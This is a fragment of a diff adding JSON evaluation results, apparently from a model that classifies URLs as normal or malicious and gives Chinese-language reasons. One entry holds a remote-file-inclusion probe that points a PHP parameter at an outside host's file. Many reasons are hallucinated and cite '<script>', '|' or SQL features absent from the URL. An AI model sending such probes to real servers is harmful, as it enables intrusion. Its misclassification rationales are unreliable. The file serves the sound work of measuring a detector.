+    "raw_response": "- 0 表示正常URL\n\nURL: /conversionorperversion/ 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。请求格式正确，参数值为正常业务数据，符合标准的HTTP请求格式。",
+    "true_label": "0"
+  },
+  {
+    "url": "/development.php?root_prefix=http://cirt.net/rfiinc.txt??",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：SQL注入、XSS、命令执行、路径遍历  \n- 恶意特征：包含`/development.php`、`http://cirt.net/rfiinc.txt`等路径，存在SQL注入和命令执行的可能。",
+    "elapsed_time_sec": 1.906,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：SQL注入、XSS、命令执行、路径遍历  \n- 恶意特征：包含`/development.php`、`http://cirt.net/rfiinc.txt`等路径，存在SQL注入和命令执行的可能。",
+    "true_label": "0"
+  },
+  {
+    "url": "/bottone_collabora/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.944,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/phpmyadmin.key",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含`/javascript/phpmyadmin.key`，其中`javascript`和`phpmyadmin`明显是JavaScript和PHP的常见脚本语言，这属于典型的XSS攻击特征。此外，`key`可能被恶意利用来执行远程代码，这符合命令注入或路径遍历的攻击类型。",
+    "elapsed_time_sec": 2.349,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含`/javascript/phpmyadmin.key`，其中`javascript`和`phpmyadmin`明显是JavaScript和PHP的常见脚本语言，这属于典型的XSS攻击特征。此外，`key`可能被恶意利用来执行远程代码，这符合命令注入或路径遍历的攻击类型。",
+    "true_label": "0"
+  },
+  {
+    "url": "/tacklockerdesigntrunks/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /tacklockerdesigntrunks/ 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "elapsed_time_sec": 1.896,
+    "raw_response": "- 0 表示正常URL\n\nURL: /tacklockerdesigntrunks/ 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "true_label": "0"
+  },
+  {
+    "url": "/barack_obama/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /barack_obama/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且未包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.538,
+    "raw_response": "- 0 表示正常URL\n\nURL: /barack_obama/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且未包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/media_advisories/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /media_advisories/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.759,
+    "raw_response": "- 0 表示正常URL\n\nURL: /media_advisories/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/player.save",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /player.save 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.629,
+    "raw_response": "- 0 表示正常URL\n\nURL: /player.save 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/news1164661200/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /news1164661200 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.754,
+    "raw_response": "- 0 表示正常URL\n\nURL: /news1164661200 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/hour.csproj",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含 `|`（命令注入）",
+    "elapsed_time_sec": 0.995,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含 `|`（命令注入）",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/program.ora",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：XSS  \n- 恶意特征：包含 `<script>`，属于XSS跨站脚本攻击的典型特征。",
+    "elapsed_time_sec": 1.249,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：XSS  \n- 恶意特征：包含 `<script>`，属于XSS跨站脚本攻击的典型特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/school of rock/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /school of rock/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.727,
+    "raw_response": "- 0 表示正常URL\n\nURL: /school of rock/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/01619286999/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.938,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/lonisemail/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /lonisemail/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.815,
+    "raw_response": "- 0 表示正常URL\n\nURL: /lonisemail/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/120670/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /120670 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.615,
+    "raw_response": "- 0 表示正常URL\n\nURL: /120670 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/webpub/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /webpub/ 是一个合法的Web请求，符合正常请求特征，没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.052,
+    "raw_response": "- 0 表示正常URL\n\nURL: /webpub/ 是一个合法的Web请求，符合正常请求特征，没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/reghelp/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /reghelp/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.708,
+    "raw_response": "- 0 表示正常URL\n\nURL: /reghelp/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/open.txt",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /open.txt 是一个合法的Web请求，符合正常请求特征。它指向一个文件，通常用于存储或读取数据，没有包含任何恶意攻击特征。因此，判定为正常请求。",
+    "elapsed_time_sec": 1.557,
+    "raw_response": "- 0 表示正常URL\n\nURL: /open.txt 是一个合法的Web请求，符合正常请求特征。它指向一个文件，通常用于存储或读取数据，没有包含任何恶意攻击特征。因此，判定为正常请求。",
+    "true_label": "0"
+  },
+  {
+    "url": "/objectweb-footer/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /objectweb-footer/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.697,
+    "raw_response": "- 0 表示正常URL\n\nURL: /objectweb-footer/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/hdr_needcreditcard263x26/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.944,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/escrowsuppliersad_e/",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：SQL注入、XSS、命令执行、路径遍历等  \n- 恶意特征：包含SQL注入、XSS、命令执行、路径遍历等攻击特征。",
+    "elapsed_time_sec": 1.577,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：SQL注入、XSS、命令执行、路径遍历等  \n- 恶意特征：包含SQL注入、XSS、命令执行、路径遍历等攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/000027952/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /000027952 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且未包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.712,
+    "raw_response": "- 0 表示正常URL\n\nURL: /000027952 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且未包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/7 worlds collide - live at the st james/",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：路径遍历（包含 `/7 worlds collide - live at the st james/`）",
+    "elapsed_time_sec": 1.293,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：路径遍历（包含 `/7 worlds collide - live at the st james/`）",
+    "true_label": "0"
+  },
+  {
+    "url": "/feast_03b/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /feast_03b/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，没有使用任何恶意攻击特征。",
+    "elapsed_time_sec": 1.391,
+    "raw_response": "- 0 表示正常URL\n\nURL: /feast_03b/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，没有使用任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/0471295639/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.959,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/product_esm/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /product_esm/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.708,
+    "raw_response": "- 0 表示正常URL\n\nURL: /product_esm/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/cerics_eb/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /cerics_eb/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.754,
+    "raw_response": "- 0 表示正常URL\n\nURL: /cerics_eb/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/soft.fcgi",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`/javascript/soft.fcgi`路径，这属于典型的恶意攻击特征，例如SQL注入、XSS、命令执行或路径遍历。",
+    "elapsed_time_sec": 1.686,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`/javascript/soft.fcgi`路径，这属于典型的恶意攻击特征，例如SQL注入、XSS、命令执行或路径遍历。",
+    "true_label": "0"
+  },
+  {
+    "url": "/493128686/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /493128686 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "elapsed_time_sec": 1.971,
+    "raw_response": "- 0 表示正常URL\n\nURL: /493128686 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "true_label": "0"
+  },
+  {
+    "url": "/homeir/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /homeir/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.693,
+    "raw_response": "- 0 表示正常URL\n\nURL: /homeir/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/2000569262048080_0/",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：路径遍历（包含 `/2000569262048080_0/`）",
+    "elapsed_time_sec": 1.24,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：路径遍历（包含 `/2000569262048080_0/`）",
+    "true_label": "0"
+  },
+  {
+    "url": "/967216195_s/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /967216195_s/ 是正常URL，因为它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，符合标准的HTTP请求格式。",
+    "elapsed_time_sec": 1.515,
+    "raw_response": "- 0 表示正常URL\n\nURL: /967216195_s/ 是正常URL，因为它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，符合标准的HTTP请求格式。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/fetch.html",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，这属于XSS攻击特征，且代码中使用了`javascript:`，属于XSS攻击的典型表现。",
+    "elapsed_time_sec": 1.276,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，这属于XSS攻击特征，且代码中使用了`javascript:`，属于XSS攻击的典型表现。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/edit.meta",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含`javascript`，属于XSS攻击特征，且包含`meta`，属于路径遍历攻击特征。",
+    "elapsed_time_sec": 1.169,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含`javascript`，属于XSS攻击特征，且包含`meta`，属于路径遍历攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/ss.nsf",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`/javascript/ss.nsf`路径，这属于典型的XSS攻击特征，因为`<script>`标签被用于执行恶意代码。此外，该URL也包含`/javascript`路径，这可能用于执行远程命令或注入攻击。",
+    "elapsed_time_sec": 2.123,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`/javascript/ss.nsf`路径，这属于典型的XSS攻击特征，因为`<script>`标签被用于执行恶意代码。此外，该URL也包含`/javascript`路径，这可能用于执行远程命令或注入攻击。",
+    "true_label": "0"
+  },
+  {
+    "url": "/btnlogin/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /btnlogin/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.717,
+    "raw_response": "- 0 表示正常URL\n\nURL: /btnlogin/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/57887137/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /57887137 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "elapsed_time_sec": 1.96,
+    "raw_response": "- 0 表示正常URL\n\nURL: /57887137 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "true_label": "0"
+  },
+  {
+    "url": "/eptafillos/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /eptafillos/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且未包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.556,
+    "raw_response": "- 0 表示正常URL\n\nURL: /eptafillos/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且未包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/u214504/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /u214504 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.616,
+    "raw_response": "- 0 表示正常URL\n\nURL: /u214504 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/20061130djihmiin/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.955,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/internblogs/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /internblogs/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.658,
+    "raw_response": "- 0 表示正常URL\n\nURL: /internblogs/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/msg45360/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /msg45360 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且未包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.615,
+    "raw_response": "- 0 表示正常URL\n\nURL: /msg45360 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且未包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/slade live in edinburgh 1981/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.894,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/cisco_spinin/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /cisco_spinin/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且未包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.531,
+    "raw_response": "- 0 表示正常URL\n\nURL: /cisco_spinin/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且未包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/190655/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /190655 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.603,
+    "raw_response": "- 0 表示正常URL\n\nURL: /190655 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/err.pdf",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含`javascript/err.pdf`，其中`javascript`明显是SQL注入攻击的特征，且`err.pdf`可能包含恶意代码或文件。因此，该URL属于异常URL。",
+    "elapsed_time_sec": 1.82,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含`javascript/err.pdf`，其中`javascript`明显是SQL注入攻击的特征，且`err.pdf`可能包含恶意代码或文件。因此，该URL属于异常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/world01/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /world01/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.715,
+    "raw_response": "- 0 表示正常URL\n\nURL: /world01/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/123356/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /123356 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.597,
+    "raw_response": "- 0 表示正常URL\n\nURL: /123356 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/06232005hearing1559/",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：路径遍历  \n- 恶意特征：包含 `/06232005hearing1559/`，这可能用于执行远程代码或访问敏感文件，属于路径遍历攻击。",
+    "elapsed_time_sec": 1.841,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：路径遍历  \n- 恶意特征：包含 `/06232005hearing1559/`，这可能用于执行远程代码或访问敏感文件，属于路径遍历攻击。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/ls.sql",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含`/javascript/ls.sql`，其中`javascript`和`ls.sql`明显是SQL注入的特征，且`ls.sql`包含SQL语句，符合SQL注入的攻击特征。",
+    "elapsed_time_sec": 1.722,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含`/javascript/ls.sql`，其中`javascript`和`ls.sql`明显是SQL注入的特征，且`ls.sql`包含SQL语句，符合SQL注入的攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/site_counter/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /site_counter/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.679,
+    "raw_response": "- 0 表示正常URL\n\nURL: /site_counter/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/street fighter zero 2/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.911,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/gdc_07/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /gdc_07/ 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "elapsed_time_sec": 1.971,
+    "raw_response": "- 0 表示正常URL\n\nURL: /gdc_07/ 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "true_label": "0"
+  },
+  {
+    "url": "/abullet3/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.23,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/shu-uemura/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /shu-uemura/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且未包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.695,
+    "raw_response": "- 0 表示正常URL\n\nURL: /shu-uemura/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且未包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/util.asmx",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，属于XSS攻击特征，且包含`javascript:`，属于XSS跨站脚本攻击。",
+    "elapsed_time_sec": 1.176,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，属于XSS攻击特征，且包含`javascript:`，属于XSS跨站脚本攻击。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/cron.java",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`/javascript/cron.java`路径，这属于典型的恶意攻击特征，例如命令执行或跨站脚本攻击。",
+    "elapsed_time_sec": 1.454,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`/javascript/cron.java`路径，这属于典型的恶意攻击特征，例如命令执行或跨站脚本攻击。",
+    "true_label": "0"
+  },
+  {
+    "url": "/whatwedo/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /whatwedo/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.777,
+    "raw_response": "- 0 表示正常URL\n\nURL: /whatwedo/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/simsswitchblade/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /simsswitchblade/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.77,
